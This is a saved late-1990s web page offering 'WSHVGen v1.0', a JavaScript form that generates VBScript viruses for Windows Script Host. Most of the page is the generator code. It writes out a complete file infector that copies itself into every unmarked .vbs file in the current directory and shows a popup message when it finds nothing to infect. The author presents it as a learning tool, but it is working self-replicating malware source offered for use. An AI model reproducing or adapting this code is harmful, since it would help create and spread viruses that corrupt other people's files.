<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0053)http://skyscraper.fortunecity.com/memo/6/wshvgen.html -->
<HTML><HEAD><TITLE></TITLE>
<META content="text/html; charset=iso-8859-1" http-equiv=Content-Type>
<META content="MSHTML 5.00.2014.210" name=GENERATOR></HEAD>
<BODY background=wshvgen_files/back.gif bgColor=#ffffff>
<P><A href="http://skyscraper.fortunecity.com/memo/6/index.html"><IMG border=0 
height=40 src="wshvgen_files/goback.gif" width=100></A></P>
<TABLE border=0 width="100%">
  <TBODY>
  <TR>
    <TD bgColor=#800000 colSpan=2><FONT size=6>WSHVGen v1.0</FONT>&nbsp; 
</TD></TR>
  <TR>
    <TD bgColor=#800000 vAlign=top><FONT size=1>Windows Scripting Host Virus 
      Generator by Bumblebee/[Hail and Kill]</FONT></TD>
    <TD><FONT size=5>What is WSH?</FONT>
      <P><FONT size=3>WSH is the Microsoft's new idea about scripting 
      Technologies:</FONT></P>
      <P><EM>The Microsoft� Windows� operating system Scripting Host is a 
      language-independent scripting host for ActiveX&#8482; scripting engines on 
      32-bit Windows platforms. Windows Scripting Host will be integrated into 
      Windows&nbsp;98, Windows&nbsp;NT� Workstation operating system version 
      5.0, and Windows&nbsp;NT Server version 5.0. </EM></P>
      <P><EM>Both Microsoft Visual&nbsp;Basic� development system Scripting 
      Edition (VBScript) and Microsoft JScript&#8482; development system scripting 
      engines are provided with Windows Scripting Host. Other software companies 
      will provide ActiveX scripting engines for languages such as Perl, TCL, 
      REXX, Python, and others. Windows Scripting Host can be run from either 
      the Windows-based host (Wscript.exe), or the command-shell-based host 
      (Cscript.exe). </EM></P>
      <P>Under Windows '95 you need to install it, but Windows '98 includes it 
      by default.</P>
      <P><FONT size=5>What is WSHVGen?</FONT></P>
      <P><FONT size=3>WSHVGen is a small script generator -this version only 
      for<EM> VBS</EM>- that allows you to make simple viruses that work in WSH. 
      You need a net-browser that supports javascript to use it.</FONT></P>
      <P><FONT size=3>WSHVGen is easy to use: Fill the following form to 
      generate a new script. Note than Infection Sign must include 
      only:</FONT><B>- @ � # $ % | � � � � *</B> <FONT size=3>like symbols. 
      Click on <I>Values</I> button for an example.<BR>The generated virus 
      infects all VBS files in current directory. If not infects at least one 
      file, then shows a payload (a popup message). Too simple, just to learn. 
      <BR><BR>This <EM>html</EM> document and his <EM>jscript</EM> code are 
      distributed under the <STRONG>GPL</STRONG>. Please send comments to: 
      </FONT><A href="mailto:bbbee@mailcity.com"><FONT 
      size=3><EM>bbbee@mailcity.com</EM></FONT></A></P>
      <P><FONT size=2><EM>There is in the web the: 
      Windows�&nbsp;Script&nbsp;Host&nbsp;Programmer's&nbsp;Reference. Search 
      for it in Microsoft site.</EM></FONT></P>
      <P><FONT size=5>WSHVGen Form</FONT></P>
      <FORM name=vForm>
      <P>Virus Id<BR><INPUT name=virId size=16> </P>
      <P>Infection Sign<BR><INPUT name=infSign size=16> </P>
      <P>Payload Message<BR><INPUT name=mess size=64> </P>
      <P><INPUT name=Submit onclick=Generate() type=button value=Generate> <INPUT name=Values onclick=setValues() type=button value=Values> <INPUT name=Reset onclick=Clear() type=button value=Reset> 
  </P></FORM></TD></TR></TBODY></TABLE>
<SCRIPT language=JavaScript>
<!--
	var f = document.vForm
	var status

	function setValues()
	{
		var d
		f.virId.value = "WSHVGen.1"
		f.infSign.value = "*@#"
		f.mess.value = "Hi! This is a WSHVGen.1 WSH Virus by Bumblebee"
	}

	function Clear()
	{
		f.virId.value = ""
		f.infSign.value = ""
		f.mess.value = ""
	}

	function Generate()
	{
		status = true
		Check(f.virId.value,"Please specify a Virus Id")
		Check(f.infSign.value,"Please specify an Infection Sign")
		Check(f.mess.value,"Please specify a Message")
		if(status) {
			var newWin = window.open()
			var newDoc = newWin.document
			var sign   = f.infSign.value

			newDoc.write("'"+sign+"<br>")
			newDoc.write("' "+f.virId.value+"<br>")
			newDoc.write("' Generated by WSHGen.1<br><br>")
			newDoc.write("endl=chr(13)&chr(10)<br><br>")
			newDoc.write("on error resume next<br><br>")
			newDoc.write("hostName=Wscript.ScriptFullName<br><br>")
			newDoc.write("set fso=createObject(\"Scripting.FileSystemObject\")<br><br>")
			newDoc.write("set fd=fso.openTextFile(hostName,1)<br>")
			newDoc.write("hostCode=fd.readAll<br>")
			newDoc.write("fd.close<br><br>")
			newDoc.write("virusSize=inStr("+(sign.length+2)+",hostCode,\"")
			newDoc.write(sign.substring(0,(sign.length-1))+"\"&\"")
			newDoc.write(sign.substring((sign.length-1),(sign.length))+"\")+1<br><br>")
			newDoc.write("set fd=fso.openTextFile(hostName,1)<br>")
			newDoc.write("virusCode=fd.read(virusSize)<br>")
			newDoc.write("fd.close<br><br>cont=0<br>")
			newDoc.write("for each victim in fso.getfolder(\".\").files<br><br>")
			newDoc.write("vExt=fso.getExtensionName(victim.name)<br>")
			newDoc.write("i=0<br>")
			newDoc.write("if mid(vExt,1,1)=\"v\" or mid(vExt,1,1)=\"V\" then")
			newDoc.write(" i=i+1 end if<br>")
			newDoc.write("if mid(vExt,2,1)=\"b\" or mid(vExt,2,1)=\"B\" then")
			newDoc.write(" i=i+1 end if<br>")
			newDoc.write("if mid(vExt,3,1)=\"s\" or mid(vExt,3,1)=\"S\" then")
			newDoc.write(" i=i+1 end if<br><br>")
			newDoc.write("if i=3 then<br>")
			newDoc.write("set fd=fso.openTextFile(victim.path,1)<br>")
			newDoc.write("victimCode=fd.readAll<br>")
			newDoc.write("fd.close<br><br>")
			newDoc.write("if left(victimCode,"+(sign.length+1)+")\<>")
			newDoc.write("chr(39)&\""+sign.substring(0,(sign.length-1))+"\"&\"")
			newDoc.write(sign.substring((sign.length-1),(sign.length))+"\" then<br>")
			newDoc.write("infectedCode=virusCode&endl&victimCode<br>")
			newDoc.write("set fd=fso.openTextFile(victim.path,2,1)")
			newDoc.write("<br>fd.write infectedCode<br>fd.close<br>cont=1<br>")
			newDoc.write("end if<br><br>end if<br>next")
			newDoc.write("<br><br>if cont=0 then msgbox\""+f.mess.value+"\",0,\""+f.virId.value+"\"")
			newDoc.write("<br><br>")
			newDoc.write("'"+sign+"<br>")
		}
	}

	function Check(field, msg)
	{
		if(field == "")
			if (status) {
				alert(msg)
				status = false
			}
	}
//-->
</SCRIPT>
</BODY></HTML>